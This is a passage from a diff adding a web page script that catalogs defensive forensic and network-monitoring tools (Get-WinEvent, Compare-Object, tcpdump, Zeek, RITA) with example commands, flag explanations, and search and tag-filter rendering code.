+    flags: [["Where-Object { … }","Filter tasks (e.g. those in the Ready state)."],["$_.State","The current task's status (Ready / Running / Disabled)."],["-TaskPath","Limit to tasks in a folder (\"\\\" = root)."],["Get-ScheduledTaskInfo","Add run history: last/next run time and result."],["Select","Choose columns such as TaskName, TaskPath, State."]] },
+
+  { name: "Get-WinEvent", tags: ["Live Investigation","Log Analysis","Threat Hunting","PowerShell"],
+    desc: "Queries Windows Event Logs; used to build incident timelines and hunt for logons, process creation, and PowerShell activity.",
+    cmds: [["Get-WinEvent -LogName Security -MaxEvents 100","Pull the last 100 security events"],["Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624}","Find successful logons"],["Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625}","Find failed logons (spray signal)"],["Get-WinEvent -LogName \"Microsoft-Windows-PowerShell/Operational\"","Review PowerShell activity"],["Get-WinEvent -FilterHashtable @{LogName='System'; StartTime=(Get-Date).AddHours(-24)}","System events from the last 24h"]],
+    flags: [["-LogName","Which event log to read (Security, System, …)."],["-MaxEvents","Cap how many events to return."],["-FilterHashtable","Fast server-side filter by log, ID, time, etc."],["ID=4624","Event ID for a successful logon."],["ID=4625","Event ID for a failed logon — useful for spray detection."],["StartTime","Only events after this time (e.g. last 24 hours)."]] },
+
+  { name: "Compare-Object", tags: ["Live Investigation","Differential Analysis","PowerShell"],
+    desc: "Compares two object sets to reveal differences. Paired with a captured Get-Service baseline, it exposes services added since a known-good snapshot — the '=>' side indicator flags what is present now but not in the baseline.",
+    cmds: [["Get-Service | Export-Clixml baseline.xml","Capture a clean baseline of services"],["$base = Import-Clixml baseline.xml","Load that baseline back in"],["$now  = Get-Service","Capture the current service list"],["Compare-Object $base $now -Property Name, Status","Diff baseline against now"],["Compare-Object $base $now -Property Name | Where-Object { $_.SideIndicator -eq \"=>\" }","Show only newly added services"]],
+    flags: [["Export-Clixml","Save the clean baseline (list of services) to a file."],["Import-Clixml","Load that saved baseline back into a variable."],["$base / $now","Variables holding the old baseline and the current state."],["-Property","Which fields to compare on (e.g. Name, Status)."],["SideIndicator","Shows where a difference lives: => only in current, <= only in baseline."],["=>","Present now but not in the baseline — i.e. newly added (suspicious)."]] },
+
+  { name: "tcpdump", tags: ["Network Investigation"],
+    desc: "Command-line packet capture and analysis; used to record and filter network traffic to identify indicators of compromise.",
+    cmds: [["tcpdump -i eth0","Watch live traffic on eth0"],["tcpdump -i eth0 -w capture.pcap","Record traffic to a file"],["tcpdump -r capture.pcap","Replay a saved capture"],["tcpdump -i eth0 host 10.0.0.5","Only one host's traffic"],["tcpdump -i eth0 'port 53'","Only DNS traffic"]],
+    flags: [["-i","Which network interface to capture from."],["-w","Write raw packets to a .pcap file for later analysis."],["-r","Read and replay packets from a saved .pcap file."],["host 10.0.0.5","Filter to traffic to/from one address."],["'port 53'","Filter to one port (53 = DNS) using a BPF expression."]] },
+
+  { name: "Zeek", tags: ["Network Investigation","Log Analysis","Threat Hunting"],
+    desc: "Network security monitor that turns traffic into rich structured logs (connections, DNS, HTTP, files) for network investigation and threat hunting.",
+    cmds: [["zeek -r capture.pcap","Turn a saved pcap into logs"],["zeek -i eth0","Monitor live traffic"],["zeek -r capture.pcap local","Process a pcap with detection scripts"],["cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p","Pull specific columns from a log"],["zeek -r capture.pcap Log::default_logdir=./logs","Set the log output folder"]],
+    flags: [["-r","Process a saved .pcap file and generate logs from it."],["-i","Monitor a live interface in real time."],["local","Load the default local detection scripts/policy."],["zeek-cut","Pull specific columns out of a Zeek log by field name."],["id.orig_h / id.resp_h","Source and destination host fields in conn.log."],["Log::default_logdir","Set the folder where Zeek writes its logs."]] },
+
+  { name: "RITA", tags: ["Network Investigation","Threat Hunting","Defense"],
+    desc: "Real Intelligence Threat Analytics — analyzes Zeek logs to detect C2 beaconing, long connections, and DNS tunneling through statistical analysis.",
+    cmds: [["rita import ./zeek_logs mydataset","Load Zeek logs into a dataset"],["rita show-beacons mydataset","Rank hosts that regularly phone home"],["rita show-long-connections mydataset","Find unusually long-lived connections"],["rita show-exploded-dns mydataset","Spot DNS tunneling / exfiltration"],["rita show-beacons mydataset | head","Show just the top beacon results"]],
+    flags: [["import","Ingest a folder of Zeek logs into a named dataset."],["mydataset","The dataset name you assign and then query against."],["show-beacons","Rank hosts by how regularly they 'phone home' — classic C2 beaconing."],["show-long-connections","Find unusually long-lived connections."],["show-exploded-dns","Break down DNS activity to spot tunneling/exfiltration."],["| head","Pipe to show only the top results."]] },
+];
+
+// ---- derive tag counts ----
+const tagCounts = {};
+TOOLS.forEach(t => t.tags.forEach(tg => tagCounts[tg] = (tagCounts[tg]||0)+1));
+const allTags = Object.keys(tagCounts).sort((a,b) => tagCounts[b]-tagCounts[a] || a.localeCompare(b));
+
+const MAX_VISIBLE_FILTERS = 4;   // only first 4 tag filters shown under the search bar
+
+const listEl = document.getElementById('list');
+const emptyEl = document.getElementById('empty');
+const searchEl = document.getElementById('search');
+const clearEl = document.getElementById('clear');
+const tagbarEl = document.getElementById('tagbar');
+const countsEl = document.getElementById('counts');
+
+let activeTags = new Set();
+let filtersExpanded = false;
+
+function makeChip(tg){
+  const b = document.createElement('button');
+  b.className = 'chip'; b.type = 'button';
+  b.setAttribute('aria-pressed', activeTags.has(tg) ? 'true' : 'false');
+  b.dataset.tag = tg;
+  b.innerHTML = `${tg}<span class="n">${tagCounts[tg]}</span>`;
+  b.addEventListener('click', () => {
+    if (activeTags.has(tg)) activeTags.delete(tg); else activeTags.add(tg);
+    b.setAttribute('aria-pressed', activeTags.has(tg) ? 'true' : 'false');
+    render();
+  });
+  return b;
+}
+
+// ---- build tag filter bar: first 4 chips + a "…" toggle for the rest ----
+function buildTagbar(){
+  tagbarEl.innerHTML = '';
+  allTags.slice(0, MAX_VISIBLE_FILTERS).forEach(tg => tagbarEl.appendChild(makeChip(tg)));
+  const rest = allTags.slice(MAX_VISIBLE_FILTERS);
+  if (filtersExpanded) rest.forEach(tg => tagbarEl.appendChild(makeChip(tg)));
+  if (rest.length){
+    const more = document.createElement('button');
+    more.className = 'chip more'; more.type = 'button';
+    more.innerHTML = '<span class="dots">…</span>';
+    more.setAttribute('aria-expanded', filtersExpanded ? 'true' : 'false');
+    more.setAttribute('aria-label', filtersExpanded ? 'Hide extra tags' : `Show ${rest.length} more tags`);
+    more.addEventListener('click', () => { filtersExpanded = !filtersExpanded; buildTagbar(); });
+    tagbarEl.appendChild(more);
+  }
+}
+buildTagbar();
+
+function esc(s){ return s.replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c])); }
+function hl(text, q){
+  const e = esc(text);
+  if (!q) return e;
+  const i = e.toLowerCase().indexOf(q.toLowerCase());
+  if (i === -1) return e;
+  return e.slice(0,i) + '<mark>' + e.slice(i, i+q.length) + '</mark>' + e.slice(i+q.length);
+}
+
+function render(){
+  const q = searchEl.value.trim();
+  clearEl.hidden = q === '';
+  const ql = q.toLowerCase();
+
+  const matches = TOOLS.map((t, i) => ({t, i}))
+    .filter(({t}) => {
+      for (const tg of activeTags) if (!t.tags.includes(tg)) return false;
+      if (ql){
+        const inName = t.name.toLowerCase().includes(ql);
+        const inTag = t.tags.some(tg => tg.toLowerCase().includes(ql));
+        if (!inName && !inTag) return false;
+      }
+      return true;
+    });
+
+  listEl.innerHTML = '';
+  matches.forEach(({t, i}) => {
+    const card = document.createElement('article');
+    card.className = 'card';
+
+    const cmds = t.cmds.map(([cmd, expl]) => {
+      const gui = cmd.startsWith('»');
+      const body = gui ? cmd.replace(/^»\s*/,'') : cmd;
+      const pr = `<span class="pr${gui?' g':''}">${gui?'»':'$'}</span> `;
+      return `<li><span class="c">${pr}${esc(body)}</span><span class="cm">${esc(expl)}</span></li>`;
+    }).join('');
+
+    const tags = t.tags.map(tg =>
+      `<button class="ctag" data-tag="${esc(tg)}">${hl(tg, (ql && tg.toLowerCase().includes(ql))?q:'')}</button>`
+    ).join('');
+
+    const flagRows = t.flags.map(([f,m]) => `<dt>${esc(f)}</dt><dd>${esc(m)}</dd>`).join('');
+
+    card.innerHTML = `
+      <div class="card-head">
+        <span class="idx">${String(i+1).padStart(2,'0')}</span>
+        <span class="name">${hl(t.name, (ql && t.name.toLowerCase().includes(ql))?q:'')}</span>
+      </div>
+      <p class="desc">${esc(t.desc)}</p>
+      <div class="card-tags">${tags}</div>
+      <div class="cmds"><ul>${cmds}</ul></div>
+      <details class="flags">
+        <summary>
+          <span class="sum-left">Flags and Options <span class="lbl-count">(${t.flags.length})</span></span>
+          <span class="caret">▾</span>
+        </summary>
+        <dl class="flagtable">${flagRows}</dl>
+      </details>`;
+    listEl.appendChild(card);
+  });
+
+  // clicking a tag inside a card toggles that filter
+  listEl.querySelectorAll('.ctag').forEach(el => {
+    el.addEventListener('click', () => {
+      const tg = el.dataset.tag;
+      if (!tg) return;
+      if (!activeTags.has(tg)) activeTags.add(tg);
+      if (allTags.indexOf(tg) >= MAX_VISIBLE_FILTERS) filtersExpanded = true; // reveal if hidden
+      buildTagbar();   // ensure the chip exists and reflects the active state
+      const chip = tagbarEl.querySelector(`.chip[data-tag="${CSS.escape(tg)}"]`);
+      if (chip) chip.setAttribute('aria-pressed','true');
+      render();
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    });
+  });
+
+  emptyEl.hidden = matches.length !== 0;
+  countsEl.textContent = `${matches.length} / ${TOOLS.length} tools`;
+}
+
+searchEl.addEventListener('input', render);
+clearEl.addEventListener('click', () => { searchEl.value=''; searchEl.focus(); render(); });
+render();
+</script>
